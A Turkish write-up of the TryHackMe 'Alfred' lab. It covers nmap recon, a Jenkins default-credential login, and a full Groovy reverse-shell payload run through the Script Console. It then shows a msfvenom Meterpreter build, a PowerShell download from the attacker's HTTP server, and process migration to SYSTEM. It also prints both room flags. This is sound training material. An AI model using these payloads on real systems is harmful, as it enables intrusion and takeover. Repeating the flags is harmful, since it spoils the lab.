# TryHackMe — Alfred Writeup

## 1. Keşif


İlk adım olarak klasik bir Nmap taraması ile hedef üzerinde açık portları ve servis versiyonlarını tespit ettim:

```bash
nmap -sS -A -p- -Pn 10.113.165.224
```
<img width="1516" height="689" alt="nmap" src="https://github.com/user-attachments/assets/9b09f4ff-6482-497b-83af-27a83555b39d" />

**Tespit edilen açık portlar:**

| Port | Servis | Versiyon |
|------|--------|----------|
| 80/tcp | HTTP | Microsoft IIS httpd 7.5 |
| 3389/tcp | RDP (ms-wbt-server) | Microsoft Terminal Service |
| 8080/tcp | HTTP | Jetty 9.4.z-SNAPSHOT |

Nmap çıktısında dikkatimi çeken birkaç önemli detay oldu:

- **80. port**: Başlıksız (title'sız) bir IIS 7.5 sayfası, ayrıca `TRACE` metodu risk taşıyor olarak işaretlenmiş.
- **3389. port**: RDP servisi açık, SSL sertifikası `commonName=alfred` bilgisini veriyor. Bu bize hedef makinenin hostname'inin **ALFRED** olduğunu doğruluyor.
- **8080. port**: Jetty üzerinde çalışan, `robots.txt` dosyasında tüm dizinlerin (`/`) disallow edildiği bir web servisi. Bu genelde bir **login paneli** veya yönetim arayüzü olduğuna işaret eder.
- OS tahmini olarak Windows Server 2008 R2 / Windows 7 aralığında bir sistem olduğu görülüyor.

---

## 2. Servis Analizi ve İlk Erişim

### 2.1 Port 80 — IIS

<img width="1919" height="564" alt="İlk site" src="https://github.com/user-attachments/assets/0f2544ad-1dfd-452d-85f2-1e820515dfad" />

Port 80 üzerinde çalışan siteye yönelik `ffuf` ile dizin/dosya taraması gerçekleştirdim:
Bu taramadan anlamlı bir sonuç elde edemedim, dolayısıyla odak noktamı **port 8080**'e kaydırdım.

### 2.2 Port 8080 — Jenkins Login Paneli

Tarayıcı üzerinden `http://10.113.165.224:8080` adresine gittiğimde bir **login paneli** ile karşılaştım. `robots.txt`'deki disallow kaydı ve arayüz tasarımı bunun bir yönetim paneli olduğunu doğruluyordu.

<img width="1919" height="874" alt="jenkins site" src="https://github.com/user-attachments/assets/bd2eb5e1-684a-478a-b4d3-f765e8a64ab5" />

Elimde herhangi bir kimlik bilgisi olmadığından, ilk denemem **varsayılan (default) credential** kombinasyonları oldu. TryHackMe görev sorusu da bunu doğrular nitelikteydi:

> *"Giriş paneli için kullanıcı adı ve şifre nedir?"* (kullanıcı adı ve şifre 5 harfli)

Birkaç deneme sonrasında en klasik ve en zayıf kombinasyon olan:

```
Kullanıcı adı : admin
Şifre         : admin
```

ile panele başarıyla giriş yaptım.

<img width="1919" height="649" alt="login" src="https://github.com/user-attachments/assets/8af3a0ca-d65e-46d0-bc04-52a8669606e1" />

## 3. Jenkins Üzerinden Uzaktan Kod Çalıştırma

Giriş yaptıktan sonra karşıma bir **Jenkins** paneli çıktı. Jenkins, CI/CD süreçlerinde yaygın kullanılan bir otomasyon aracıdır ve doğru yapılandırılmadığında ciddi bir saldırı yüzeyi sunar.

**Manage Jenkins → Script Console** yolunu takip ettiğimde, sunucu üzerinde doğrudan **Groovy script** çalıştırabileceğim bir alan buldum:

> *"Type in an arbitrary Groovy script and execute it on the server"*

<img width="1919" height="654" alt="script console" src="https://github.com/user-attachments/assets/68038b77-18e9-4d7e-9311-1236bcafafb5" />

Bu, Jenkins'te bilinen ve çok kritik bir uzaktan kod çalıştırma vektörüdür. Groovy reverse shell payload'ları için araştırma yaptığımda [frohoff'un gist sayfasına](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ulaştım ve payload'ı kendi IP/port bilgilerime göre düzenledim:

```groovy
String host="192.168.134.19";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();
```

Payload'ı çalıştırmadan önce, kendi makinemde bağlantıyı karşılamak için bir **Netcat listener** ayağa kaldırdım:

```bash
nc -lvnp 8044
```
Script'i **Execute** butonuna basarak çalıştırdım ve listener tarafında bağlantının düştüğünü gördüm

<img width="554" height="105" alt="shell1" src="https://github.com/user-attachments/assets/9754e8b7-9926-4264-9f50-e9e16d11bc7f" />

---

## 4. User Flag

Shell'i aldıktan sonra ilk hedefim `user.txt` flag'ini bulmaktı. `bruce` kullanıcısının masaüstü dizinini kontrol ettim:

```powershell
C:\Users\bruce\Desktop>type user.txt
```
<img width="309" height="55" alt="flag1" src="https://github.com/user-attachments/assets/00a45a8a-bb06-4972-939e-ae3444f890fd" />

```
79007a09481963edf2e1321abd9ae2a0
```
---

## 5. Yetki Yükseltme

### 5.1 Mevcut Yetkilerin Kontrolü

Sistemde hangi haklara sahip olduğumu görmek için `whoami /priv` komutunu çalıştırdım:

```powershell
C:\Program Files (x86)\Jenkins>whoami /priv
```
<img width="687" height="516" alt="whoamipriv" src="https://github.com/user-attachments/assets/a5606ce6-f69d-4ddd-8eb3-aced43bdcbc2" />

Çıktıda dikkatimi çeken en önemli iki privilege şunlardı:

| Privilege | Durum | Önemi |
|-----------|-------|-------|
| `SeImpersonatePrivilege` | Enabled | Token impersonation saldırıları (Potato ailesi vb.) için kritik |
| `SeDebugPrivilege` | Enabled | Diğer process'lere debug erişimi, process injection/migration için kritik |

Bu iki privilege'ın aktif olması, sistemde **SYSTEM** yetkisine yükselme potansiyeli olduğunu gösteriyordu.

### 5.2 Meterpreter Beacon Hazırlığı

Görev, bir **msfvenom** payload'ı oluşturup hedefe taşımamı istiyordu. Öncelikle yazılabilir bir dizin oluşturdum:

```powershell
mkdir beacon
cd beacon
```

Kendi makinemde `msfvenom` ile x86 mimarisine uygun, encode edilmiş bir Meterpreter reverse TCP payload'ı ürettim:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 \
  --encoder x86/shikata_ga_nai \
  LHOST=192.168.134.19 LPORT=4444 \
  -f exe -o shell-name.exe
```

<img width="1271" height="205" alt="beacon" src="https://github.com/user-attachments/assets/1d8e0618-b5ae-4260-a7a7-1c1372af4043" />


Payload dosyasını hedefe ulaştırmak için kendi dizinimde basit bir HTTP sunucusu açtım:

```bash
python3 -m http.server 8000
```
<img width="693" height="124" alt="pythonserver" src="https://github.com/user-attachments/assets/5af23249-e47a-4aa4-8989-07a9fa9c1e75" />

Hedef makine üzerinden PowerShell ile dosyayı indirdim:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://192.168.134.19:8000/shell-name.exe','shell-name.exe')"
```
<img width="1158" height="678" alt="shellalma" src="https://github.com/user-attachments/assets/1d5f90b9-ecb6-4a12-967c-cf95749c6ab9" />

### 5.3 Metasploit Handler ve Shell'in Tetiklenmesi

Payload çalıştırılmadan önce, bağlantıyı karşılayacak **multi/handler** modülünü ayarladım:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.134.19
set LPORT 4444
run
```

<img width="910" height="600" alt="msfconsole ayarlar" src="https://github.com/user-attachments/assets/40a5c9d0-a68f-4bd4-b8d7-b302b0f79b29" />

Ardından hedef sistemde payload'ı çalıştırdım:

```powershell
Start-Process "shell-name.exe"
```

Bu işlemle birlikte Metasploit handler tarafında bir Meterpreter oturumu açıldı:

<img width="907" height="173" alt="shell2" src="https://github.com/user-attachments/assets/8e80945e-b7a1-4783-9958-43f33e634953" />

### 5.4 Process Migration ile Token Sorununun Çözülmesi

`getsystem` başarılı olmasına rağmen, Windows'un token yönetim mantığı gereği **daha yüksek ayrıcalıklı bir token'a sahip olmak, o process'in gerçekten o izinlerle çalıştığı anlamına gelmez.** Windows, bir process'in yapabileceklerini belirlerken impersonation token'ı değil, **primary token**'ı esas alır.

Bu nedenle, doğru izinlere sahip başka bir process'e **migrate** olmam gerekiyordu. En güvenli seçim genellikle `services.exe` process'idir. Ayrıca elimdeki session **32-bit** olduğundan, 64-bit kodla tam etkileşim kurabilmek için 64-bit bir process'e geçiş yapmam gerekiyordu.

Öncelikle çalışan process'leri listeledim:

```
meterpreter > ps
```

<img width="1142" height="365" alt="migrate1" src="https://github.com/user-attachments/assets/1f41244d-b1b7-468e-be22-9a167be2422c" />


`services.exe` process'ini buldum:

```
668   580   services.exe   x64   0   NT AUTHORITY\SYSTEM   C:\Windows\System32\services.exe
```

Bu process'e migrate oldum:

```
meterpreter > migrate 668
[*] Migrating from 2600 to 668...
[*] Migration completed successfully.
```
<img width="368" height="49" alt="migrate2" src="https://github.com/user-attachments/assets/ab6f4e28-6b08-4ac6-aea9-5945b171199c" />

---

## 6. Root Flag

`services.exe` process'ine geçtikten sonra artık gerçek anlamda tam yetkili SYSTEM haklarına sahiptim. Root flag dosyasını okudum:

```
meterpreter > cat C:/Windows/System32/config/root.txt
```
<img width="451" height="31" alt="flag2" src="https://github.com/user-attachments/assets/ef75939a-00a5-465c-bb5f-af0afc48d319" />

```
dff0f748678f280250f25a45b8046b4a
```
